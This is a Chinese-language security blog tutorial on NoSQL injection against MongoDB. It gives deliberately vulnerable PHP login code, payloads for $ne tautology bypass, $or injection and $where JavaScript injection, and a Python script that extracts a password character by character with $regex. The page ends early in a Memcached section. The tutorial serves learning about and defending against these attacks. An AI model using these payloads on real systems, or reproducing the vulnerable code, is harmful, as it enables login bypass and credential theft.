<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Time'Blog | Time'Blog</title><meta name="author" content="Time"><meta name="copyright" content="Time"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="article">
<meta property="og:title" content="Time&#39;Blog">
<meta property="og:url" content="https://timeshu.github.io/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/index.html">
<meta property="og:site_name" content="Time&#39;Blog">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-06-23T07:36:16.290Z">
<meta property="article:modified_time" content="2021-01-25T18:05:35.044Z">
<meta property="article:author" content="Time">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://timeshu.github.io/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?5dd9b277051da31b80703896f0394cce";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Time\'Blog',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-26 02:05:35'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Time'Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-06-23T07:36:16.290Z" title="发表于 2020-06-23 15:36:16">2020-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-25T18:05:35.044Z" title="更新于 2021-01-26 02:05:35">2021-01-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg29h2writj31c00u0e81.jpg" alt="36"></p>
<span id="more"></span>

<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>​    网络已经成为了现代社会中的第五世界，而说起网络就不得不提起数据库,数据库作为存储信息的应用软件，已经深入到了各行各业，购物、外卖、银行、游戏、出行等，可以说只要是提供服务给用户使用的软件或者网站都离不开数据库的应用。而用的最多的是关系型数据库，例如：MYSQL、MSSQL、Oracle。而本文讲解的是非关系型数据库(NoSQL)，NoSQL数据库知道的最多的可能就是MongoDB、Redis、Memcached、Cassandra，但是你们知道NoSQL数据库还有那些吗？NoSQL的注入你们了解的多吗？NoSQL数据库中有哪些数据库是可getshell的？本文就带你了解一下什么是NoSQL数据库，NoSQL数据库的注入方法及getshell的方法。</p>
<h3 id="0x01-NoSQL数据库特性"><a href="#0x01-NoSQL数据库特性" class="headerlink" title="0x01 NoSQL数据库特性"></a>0x01 NoSQL数据库特性</h3><p>​    NoSQL全称是Not Only SQL，意为不仅仅的SQL。是一种非关系型数据存储模式，它存储的不再是结构化数据，而是类型和固定的格式，以key-value键值对、列式、文档来存储。而相较于关系型数据库，非关系数据库的优点有如下几点：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1、快速读写</span><br><span class="line">	主要例子有Redis，由于其逻辑简单，而且纯内存操作，使得其性能非常出色，单节点每秒可以处理超过10万次读写操作。</span><br><span class="line">2、方便扩展</span><br><span class="line">	NoSQL去掉关系数据库的关系型特性，很容易横向扩展，摆脱了以往老是纵向扩展的诟病。</span><br><span class="line">3、低廉成本</span><br><span class="line">	相较于关系型数据库来说，企业级授权费用降低很多。</span><br><span class="line">4、灵活的数据类型</span><br><span class="line">	NoSQL无需事先为要存储的数据建立字段，随时可以存储自定义的数据格式。</span><br></pre></td></tr></tbody></table></figure>

<p>NoSQL数据库分类和特点如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggagqjf0fbj30th08yzmk.jpg" alt="image-20200630175238730"></p>
<h3 id="0x02-Nosql数据库注入"><a href="#0x02-Nosql数据库注入" class="headerlink" title="0x02 Nosql数据库注入"></a>0x02 Nosql数据库注入</h3><p>NoSQL数据库虽然不使用SQL语句，但用网上的一句话来说，有DB的地方就有injection。且NoSQL注入的危害更大，因语句是以Web应用程序的语言来注入并在服务器上执行，从而导致允许任意代码执行，所以潜在影响要大于传统的SQL注入。</p>
<p>NoSQL注入攻击流程(此图来源于owasp)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnkiz8lkwj31ie0sedo6.jpg" alt="image-20200712015600235"></p>
<p>NoSQL注入大概分为重言式、联合查询、Javascript、盲注、背负式查询、跨域违规等，由于背负式查询和跨域违规两种方式资料太少，也没有实战环境可测试，所以着重讲解前面几种注入方式。(此处使用MongoDB数据库来进行演示)</p>
<p>准备测试数据</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">创建数据库</span><br><span class="line">use admin //创建一个admin数据库,如果有admin数据库就选择admin数据库</span><br><span class="line">插入数据</span><br><span class="line">db.admin.insert({'username':'time','password':'11111'})//默认会自动创建admin集合</span><br><span class="line">查询数据</span><br><span class="line">db.admin.find()//查询所有数据</span><br><span class="line">查看所有数据库</span><br><span class="line">show dbs </span><br><span class="line">查看集合</span><br><span class="line">show collections</span><br></pre></td></tr></tbody></table></figure>

<h4 id="1、重言式"><a href="#1、重言式" class="headerlink" title="1、重言式"></a>1、重言式</h4><p>又称永真式，既在条件语句中注入代码使其表达式判定结果永远为真，从而绕过认证或访问机制。而怎么使其注入代码后让表达式判定结果永远为真，此处就不得不说一下Mongodb数据库的条件操作符了。如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$eq : =    	//匹配字段值等于指定值的文档</span><br><span class="line">$gt : &gt;		//匹配字段值大于指定值的文档</span><br><span class="line">$lt : &lt;		//匹配字段值小于指定值的文档</span><br><span class="line">$gte: &gt;=	//匹配字段值大于等于指定值的文档</span><br><span class="line">$lte: &lt;=	//匹配字段值小于等于指定值的文档</span><br><span class="line">$ne : !=	//匹配字段值不等于指定值的文档，包括没有这个字段的文档</span><br><span class="line">$in : in	//匹配字段值等于指定数组中的任何值</span><br><span class="line">$nin: not in	//字段值不在指定数组或者不存在</span><br><span class="line">$and		//文档至少满足其中的一个表达式</span><br><span class="line">$or:or		//文档至少满足其中的一个表达式</span><br><span class="line">$not: 		//反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在</span><br><span class="line">模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })</span><br></pre></td></tr></tbody></table></figure>

<p>而在重言式注入中需要用到的就是$ne，意为不等于指定值的数据查询出来，表达式ne=1，就是把数据库中除ne=1的所有值，全部查询出来。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line"><span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'uname'</span> =&gt; <span class="variable">$uname</span>,</span><br><span class="line">    <span class="string">'pwd'</span> =&gt; <span class="variable">$pwd</span></span><br><span class="line">));</span><br><span class="line"><span class="comment"># 执行语句</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;executeQuery(<span class="string">'admin.admin'</span>, <span class="variable">$query</span>)-&gt;toArray();</span><br><span class="line"><span class="variable">$count</span> = count(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) {</span><br><span class="line">        <span class="variable">$user</span> = ((<span class="keyword">array</span>)<span class="variable">$user</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span> . <span class="variable">$user</span>[<span class="string">'uname'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span> . <span class="variable">$user</span>[<span class="string">'pwd'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not Found'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>如图，此处输入对的账号密码查询出一条语句</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv7k8vhmj30nr03ot8x.jpg" alt="image-20200709174904553"></p>
<p>如果输入以下代码，则会将数据库中所有的账户密码全部查询出来</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.239.135/n/login.php?username[$ne]=1&amp;password[$ne]=1</span><br><span class="line">此处$ne是把数据库中$ne等于1之外的数据都查询出来 </span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv6kn97cj30lo05qjs0.jpg" alt="image-20200709174804855"></p>
<p>如果输入username[$ne]=time&amp;password[$ne]=time111,会将账户不是time的所有数据显示。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnm5bfcgkj315e0cmq3s.jpg" alt="image-20200712025211991"></p>
<p>当用户输入username[$ne]=1&amp;password[$ne]=1的时候，程序会将用户输入的账户密码构造成以下数据带入数据库中查询。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$query = new MongoDB\Driver\Query(array(</span><br><span class="line">	'uname' =&gt; array($ne =&gt; 1),</span><br><span class="line">	'pwd' =&gt; array($ne =&gt; 1)</span><br><span class="line">));</span><br></pre></td></tr></tbody></table></figure>

<p>数据库中查询出用户想要的数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnmlultjtj314a0jk0w2.jpg" alt="image-20200712030805742"></p>
<h4 id="2、联合查询"><a href="#2、联合查询" class="headerlink" title="2、联合查询"></a>2、联合查询</h4><p>​    攻击者利用一个脆弱的参数去改变给定查询返回的数据集，最常用的用法是绕过认证页面获取数据。比如通过增加永真式的表达式利用布尔的OR运算符导致整个语句判定出错。(因没有找到测试环境，此处大概讲一下注入方式)</p>
<p>小栗子：登录代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">string query = "{ username:'" + post_username + "', password:'" + post_passport + ' " }"</span><br></pre></td></tr></tbody></table></figure>

<p>当我们登录账户时，正确的查询语句如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{‘username’:'time',‘password’:'time111'}</span><br></pre></td></tr></tbody></table></figure>

<p>如果构造一个恶意代码来忽略密码，那么就可以无需密码的情况下登录用户账号。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">username=time',$or:[{},{'a':'a&amp;password='}]</span><br><span class="line"></span><br><span class="line">构造的恶意语句</span><br><span class="line">{'username':'time', '$or':[{},{'a':'a','password':''}]}</span><br></pre></td></tr></tbody></table></figure>

<p>当将恶意语句带入数据库查询的时候匹配到当前用户的数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnqw0c15wj316e06i0u7.jpg" alt="image-20200712053615213"></p>
<h4 id="3、JavaScript注入"><a href="#3、JavaScript注入" class="headerlink" title="3、JavaScript注入"></a>3、JavaScript注入</h4><p>新型注入漏洞，由允许执行数据内容中的javascript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事物和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。而Mongodb中的$where操作符就可以用来执行Javascript语句。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line"><span class="variable">$query_body</span> =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'$where'</span>=&gt;<span class="string">"function q() {</span></span><br><span class="line"><span class="string">	var username = "</span>.<span class="variable">$_REQUEST</span>[<span class="string">"username"</span>].<span class="string">";</span></span><br><span class="line"><span class="string">	var password = "</span>.<span class="variable">$_REQUEST</span>[<span class="string">"password"</span>].<span class="string">";if(username == 'time'&amp;&amp;password == 'time111') return true; else{ return false;}}</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="variable">$query_body</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;executeQuery(<span class="string">'test.test'</span>, <span class="variable">$query</span>)-&gt;toArray();</span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>){</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>当不知道账号密码的时候，在地址栏随意输入字符，页面返回错误</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8tuedj8j31p00cqwfi.jpg" alt="image-20200710014015410"></p>
<p>当在参数后加上;return true;时页面返回ok</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8uvx2vsj31uc094wff.jpg" alt="image-20200710014115770"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload：username=1&amp;password=1;return ture;</span><br><span class="line"></span><br><span class="line">当输入return ture;程序会构造出以下语句</span><br><span class="line">'$where'=&gt;"function q() {</span><br><span class="line">	var username = ".$_REQUEST["username"].";</span><br><span class="line">	var password = ".$_REQUEST["password"].";</span><br><span class="line">	//在此处添加一段代码，不管用户输入什么都返回ture</span><br><span class="line">	return ture;</span><br><span class="line">	if(username == 'time'&amp;&amp;password == 'time111') return true; else{ return false;}}</span><br><span class="line">");</span><br><span class="line">带入数据库中查询成功</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggns7rphjij31hg08i76f.jpg" alt="image-20200712062208900"></p>
<h4 id="4、盲注"><a href="#4、盲注" class="headerlink" title="4、盲注"></a>4、盲注</h4><p>NoSQL的盲注和SQL注入盲注类似，都是不返回数据，只是根据错误页面的返回来判断是否存在注入。此处我们需要用到的MongoDB的操作符来进行盲注$eq(等于)和$regex(正则匹配)</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> mongoclient();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;users; <span class="comment">//选择集合</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_REQUEST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$username</span>)) {</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$coll</span>-&gt;find(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;count()&gt;<span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'time no'</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">'time'</span>&amp;&amp;<span class="variable">$password</span>==<span class="string">'time111'</span>) {</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'login no'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>随意输入字符，页面返回错误</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsoj1q10j30yi05k0t8.jpg" alt="image-20200712063815493"></p>
<p>如果使用已知用户名为time，页面同样返回错误，而怎么才能确定账户是否正确，此时需要借助操作符$eq+burp，可以帮我们快速查找正确的账户。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnspqotjaj312c062t99.jpg" alt="image-20200712063925476"></p>
<p>首先找一个字典，由于我本地环境，所以用了四个账户测试。抓包</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload：username[$eq]=§1111§&amp;password=111</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsx0ojetj31cw0qmjva.jpg" alt="image-20200712064625094"></p>
<p>设置字典</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsy1hlnlj30s20ik764.jpg" alt="image-20200712064724308"></p>
<p>可以看见，跑出两个正确的用户名。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsz0t6h2j31920sydj3.jpg" alt="image-20200712064820187"></p>
<p>当确定了账号后，密码则使用正则匹配$regex来获取</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//判断密码长度</span><br><span class="line">http://10.211.55.3/news.php?username[$eq]=time&amp;password[$regex]=.{7}</span><br><span class="line">http://10.211.55.3/news.php?username[$eq]=time&amp;password[$regex]=t.{6}</span><br><span class="line">http://10.211.55.3/news.php?username[$eq]=time&amp;password[$regex]=ti.{5}</span><br><span class="line">http://10.211.55.3/news.php?username[$eq]=time&amp;password[$regex]=tim.{4}</span><br><span class="line">以此类推</span><br><span class="line">数据库中查询语句会使用$regex和^</span><br><span class="line">{'username':{'$eq':'time'},'password':{'$regex':'^'}}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntbiy2e8j316g08a40m.jpg" alt="image-20200712070021751"></p>
<p>而密码就有些复杂了，不能使用burp，不过可以借助脚本来测试。</p>
<p>脚本:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">username = 'admin'</span><br><span class="line">password = ''</span><br><span class="line">target = 'http://127.0.0.1/mongo/test.php'</span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in ['*', '+', '.', '?', '|', '#', '&amp;', '$']:</span><br><span class="line">            payload = '?username=%s&amp;password[$regex]=^%s' % (username, password + c)</span><br><span class="line">            r = requests.get(target + payload)</span><br><span class="line">            if 'OK' in r.text:</span><br><span class="line">                print("Found one more char : %s" % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></tbody></table></figure>

<h4 id="5、背负式查询"><a href="#5、背负式查询" class="headerlink" title="5、背负式查询"></a>5、背负式查询</h4><p> 背负式查询是Memcached数据库的的一种注入，在php5.5的时候该漏洞被修复，由于网上资料较少，所以此处在网上摘抄了一部分作为了解。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">set &lt;KEY&gt; &lt;FLAG&gt; &lt;EXPIRE_TIME&gt;   &lt;LENGTH&gt;,</span><br></pre></td></tr></tbody></table></figure>

<p>当PHP配置的函数被调用时，接收参数如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$memcached-&gt;set('key', 'value');</span><br></pre></td></tr></tbody></table></figure>

